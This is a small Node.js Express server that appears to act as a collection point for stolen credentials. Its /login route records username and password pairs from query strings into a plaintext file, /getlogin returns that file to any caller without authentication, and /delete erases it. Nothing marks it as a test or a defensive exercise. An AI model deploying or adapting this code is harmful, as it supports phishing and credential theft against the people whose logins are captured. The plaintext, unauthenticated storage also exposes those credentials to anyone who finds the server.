const express = require("express");
const fs = require("fs");
const app = express();
const port = 3000;

const filename = "/tmp/login.txt";

app.get("/login", (req, res) => {
  const login = req.query.login;
  const pass = req.query.pass;
  try {
    appendToFile(`${login} === ${pass}`);
  } catch (error) {
    return res.send(JSON.stringify(error));
  }
  res.send("test!");
});

app.get("/getlogin", (req, res) => {
  try {
    if (fs.existsSync(filename)) {
      // Send file directly
      res.sendFile(filename);
    } else {
      res.status(404).send("File not found");
    }
  } catch (error) {
    res.status(500).send("Error reading file: " + error.message);
  }
});

app.get("/delete", (req, res) => {
  try {
    if (fs.existsSync(filename)) {
      fs.unlinkSync(filename);
      res.status(200).send("File deleted successfully");
    } else {
      res.status(404).send("File not found");
    }
  } catch (error) {
    res.status(500).send("Error deleting file: " + error.message);
  }
});

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`);
});

function appendToFile(text) {
  if (!fs.existsSync(filename)) {
    fs.writeFileSync(filename, "");
  }

  fs.appendFileSync(filename, text + "\n", (err) => {
    if (err) {
      console.error("Error writing to file:", err);
      return;
    }
  });
}
